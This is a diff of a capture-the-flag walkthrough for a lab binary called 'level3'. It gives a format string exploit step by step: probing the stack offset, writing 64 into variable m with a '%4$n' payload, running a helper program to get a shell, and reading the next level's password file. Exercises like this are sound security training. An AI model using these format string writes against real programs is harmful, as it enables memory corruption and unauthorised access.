@@ -23,12 +23,17 @@ we see that the max number of char returned is 511 A  + '\0'
 python -c "print 'A'*4 + ' %4\$x'" | ./level3
 > AAAA 41414141
 
-#we need to modify m with a value of 60
+#we need to modify m with a value of 64
 #we know the address of m
 #the printf of %nb\$p with nb a number told us we are at 4 of the start of the string of printf
 #so if we put \x8c\x98\x04\x08%4$n
-#we write 4 in m
-#so we just need to put 64 in m and it is won
+#we write the value 4 in m
+
+#=> so we just need to put 64 in m and it is won (cf code of print.c)
+
+vim print.c
+gcc print.c
+(./a.out ; cat) | ~/level3
 
 cd /home/user/level4
 cat .pass
